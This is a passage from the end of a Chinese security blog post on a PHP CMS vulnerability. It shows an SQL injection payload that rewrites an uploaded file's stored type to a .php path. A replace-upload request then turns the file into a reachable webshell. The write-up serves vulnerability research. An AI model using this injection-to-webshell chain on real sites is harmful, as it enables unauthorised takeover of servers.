class="string">'eval'</span>,<span class="string">'image/jpeg'</span>,<span class="string">'a:2:&#123;s:5:"width";N;s:6:"height";N;&#125;'</span>,<span class="string">'6joq7hdmh7gf5bqrsphpc1via7'</span>,<span class="string">'0'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>构造将<code>mimetype</code>改为<code>res/gqy.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval&#39;,&#39;l&#39;,1,&#39;1&#39;),(&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;jpg&#39;,0x7265732f6771792e706870,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;10&#39;,&#39;1&#39;)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/25/RKaSeZLrIQhzEF1.png" alt="Snipaste_2020-03-25_15-07-43.png"></p>
+<p>（<code>api/upload_control.php</code>中只有<code>save_f()</code>方法）</p>
+<p>再调用<code>www/upload_control.php</code>中的<code>replace_f()</code>方法，注意<code>1422</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?c&#x3D;upload&amp;f&#x3D;replace&amp;oldid&#x3D;1422</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><img src="https://i.loli.net/2020/03/24/2AeWM8xdVyoj3fb.png" alt="Snipaste_2020-03-24_16-26-28.png"></p>
+<p>访问<code>/res/gqy.php</code></p>
+<p><img src="https://i.loli.net/2020/03/25/fnOrm2K3al97JQw.png" alt="Snipaste_2020-03-25_15-13-47.png"></p>
+<hr>
+<h4><span id="总结">总结</span></h4><p>现在传统的getshell很少直接出现。利用sql注入修改上传文件的文件名，修改数据库中对上传文件格式的设置，发现sql注入之后可以往这方面考虑能否扩大危害。</p>
+<hr>
+<h3><span id="参考链接">参考链接</span></h3><p> <a href="https://xz.aliyun.com/t/1569" target="_blank" rel="noopener">https://xz.aliyun.com/t/1569</a> </p>
+<p> <a href="https://forum.90sec.com/t/topic/728/10" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/728/10</a> </p>
+<p> <a href="https://www.anquanke.com/post/id/194453" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194453</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i> php代码审计</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2020/03/23/WeCenter-v3-3-4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+        <span class="next-text nav-default">WeCenter_v3.3.4漏洞分析</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
